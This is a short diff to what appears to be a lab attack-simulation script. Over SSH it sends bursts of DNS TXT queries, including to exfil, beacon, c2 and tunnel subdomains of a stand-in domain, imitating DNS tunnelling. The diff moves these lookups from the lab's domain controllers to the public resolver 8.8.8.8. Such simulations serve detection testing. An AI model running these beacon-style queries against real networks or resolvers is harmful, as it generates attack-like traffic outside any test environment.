@@ -11,12 +11,12 @@ echo "=== Running TXT query attack on linux01 ($LINUX01) ==="
 
 ssh -o StrictHostKeyChecking=no "vagrant@$LINUX01" "
 for domain in google.com example.com github.com outlook.com yahoo.com cloudflare.com amazon.com microsoft.com facebook.com twitter.com; do
-    dig @$DC01 TXT \$domain +short &
+    dig @8.8.8.8 TXT \$domain +short &
 done
 wait
 echo '--- Standard TXT done ---'
 for sub in exfil data beacon c2 tunnel; do
-    dig @$DC02 TXT \$sub.evil-domain.tk +short &
+    dig @8.8.8.8 TXT \$sub.evil-domain.tk +short &
 done
 wait
 " 2>/dev/null
